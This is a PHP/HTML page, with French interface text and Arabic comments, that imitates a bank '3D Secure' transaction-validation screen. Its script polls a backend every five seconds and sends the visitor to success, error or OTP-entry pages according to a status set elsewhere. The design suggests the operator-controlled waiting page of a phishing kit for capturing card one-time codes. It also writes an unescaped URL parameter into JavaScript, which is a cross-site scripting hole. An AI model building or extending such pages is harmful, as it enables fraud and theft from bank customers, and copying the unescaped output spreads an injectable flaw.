<?php
require_once 'auth_check.php';
session_start();
require_once 'functions.php';

// التحقق من وجود معرف الجلسة
$sessionId = $_GET['session'] ?? null;

// التحقق من وجود معرف الجلسة والبيانات
if (!$sessionId) {
    header('Location: index.php');
    exit;
}

// استرجاع بيانات المعاملة
$transactionData = getTransactionData($sessionId);
if (!$transactionData) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation en cours</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .validation-container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        .bank-app-icon {
            width: 80px;
            height: 80px;
            background: #007bff;
            border-radius: 20px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }

        .bank-app-icon i {
            font-size: 40px;
        }

        .title {
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: bold;
        }

        .notice {
            background: #f8f9fa;
            border-left: 4px solid #007bff;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
        }

        .notice-title {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: bold;
            margin-bottom: 10px;
            color: #333;
        }

        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .secure-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            color: #28a745;
            margin-top: 30px;
            font-size: 14px;
            background: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
        }

        .secure-badge i {
            font-size: 18px;
        }

        #status-message {
            color: #007bff;
            font-weight: bold;
            padding: 5px 10px;
            background: #e7f3ff;
            border-radius: 3px;
            display: inline-block;
            transition: all 0.3s ease;
        }
        
        #status-message.approved {
            color: #28a745;
            background: #d4edda;
        }
        
        #status-message.rejected {
            color: #dc3545;
            background: #f8d7da;
        }
        
        #status-message.waiting {
            color: #ffc107;
            background: #fff3cd;
        }
        
        #status-message.otp_required {
            color: #17a2b8;
            background: #d1ecf1;
        }
        
        #status-message.pending {
            color: #007bff;
            background: #e7f3ff;
        }
        
        #status-message.otp_incorrect {
            color: #dc3545;
            background: #f8d7da;
        }
    </style>
</head>
<body>
    <div class="validation-container">
        <div class="bank-app-icon">
            <i class="fas fa-university"></i>
        </div>
        
        <h1 class="title">Validation en cours</h1>
        
        <div class="notice">
            <div class="notice-title">
                <i class="fas fa-info-circle"></i>
                Information importante
            </div>
            <p>Votre demande est en cours de traitement. Veuillez patienter pendant que nous vérifions vos informations.</p>
            <p>Cette étape peut prendre quelques minutes. Ne fermez pas cette fenêtre.</p>
            <p><strong>Statut:</strong> <span id="status-message">En attente de validation</span></p>
        </div>

        <div class="loader"></div>

        <div class="secure-badge">
            <i class="fas fa-shield-alt"></i>
            Sécurisé par 3D Secure
        </div>
    </div>

    <script>
        const sessionId = '<?php echo $sessionId; ?>';
        let checkStatusInterval;
        let lastStatus = '';

        function checkTransactionStatus() {
            fetch('send_action.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: 'check_status',
                    session_id: sessionId
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // تجنب تكرار نفس الإجراء
                    if (lastStatus === data.status) {
                        return;
                    }
                    lastStatus = data.status;
                    
                    // تحديث رسالة الحالة
                    const statusElement = document.getElementById('status-message');
                    if (statusElement) {
                        statusElement.textContent = data.message || 'En attente de validation';
                        // إزالة جميع الclasses وإضافة الclass المناسب
                        statusElement.className = '';
                        statusElement.classList.add(data.status);
                    }

                    switch(data.status) {
                        case 'approved':
                            const approvedMsg = document.getElementById('status-message');
                            approvedMsg.textContent = 'Transaction approuvée';
                            approvedMsg.className = 'approved';
                            clearInterval(checkStatusInterval);
                            window.location.href = 'success.php?session=' + sessionId;
                            break;
                        case 'rejected':
                            const rejectedMsg = document.getElementById('status-message');
                            rejectedMsg.textContent = 'Transaction rejetée';
                            rejectedMsg.className = 'rejected';
                            clearInterval(checkStatusInterval);
                            window.location.href = 'error.php?session=' + sessionId;
                            break;
                        case 'otp_required':
                            const otpMsg = document.getElementById('status-message');
                            otpMsg.textContent = 'Code OTP requis';
                            otpMsg.className = 'otp_required';
                            clearInterval(checkStatusInterval);
                            window.location.href = 'otp.php?session=' + sessionId;
                            break;
                        case 'waiting':
                            // البقاء في صفحة الانتظار وتحديث الرسالة
                            const waitingMsg = document.getElementById('status-message');
                            waitingMsg.textContent = 'Transaction en attente';
                            waitingMsg.className = 'waiting';
                            console.log('Transaction en attente...');
                            break;
                        case 'otp_incorrect':
                            const otpIncorrectMsg = document.getElementById('status-message');
                            otpIncorrectMsg.textContent = 'Code OTP incorrect';
                            otpIncorrectMsg.className = 'otp_incorrect';
                            clearInterval(checkStatusInterval);
                            window.location.href = 'otp.php?session=' + sessionId;
                            break;
                        case 'pending':
                            const pendingMsg = document.getElementById('status-message');
                            pendingMsg.textContent = 'En cours de validation';
                            pendingMsg.className = 'pending';
                            break;
                    }
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }

        // بدء فحص الحالة كل 5 ثوانٍ
        checkStatusInterval = setInterval(checkTransactionStatus, 5000);
        // فحص الحالة مباشرة عند تحميل الصفحة
        checkTransactionStatus();
    </script>
</body>
</html> 